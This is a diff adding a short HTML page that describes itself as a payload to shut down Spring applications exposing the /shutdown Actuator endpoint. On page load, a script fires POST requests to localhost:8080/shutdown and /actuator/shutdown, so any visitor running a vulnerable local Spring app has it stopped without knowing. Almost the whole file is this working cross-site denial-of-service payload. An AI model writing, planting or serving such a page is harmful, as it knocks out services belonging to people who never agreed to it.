@@ -1,0 +1,20 @@
+<html>
+<head>
+  </head>
+  <body onload="shutdownActuator()">
+    This contains the payload to shutdown Spring applications containing the /shutdown Actuator
+    </body>
+
+    <script>
+    function shutdownActuator() {
+      var shutdownOld = new XMLHttpRequest();
+      shutdownOld.open("POST", "http://localhost:8080/shutdown");
+      shutdownOld.send(null);
+      var shutdownNew = new XMLHttpRequest();
+      shutdownNew.open("POST", "http://localhost:8080/actuator/shutdown");
+      shutdownNew.send(null);
+    }
+    </script>
+
+    </html>
+
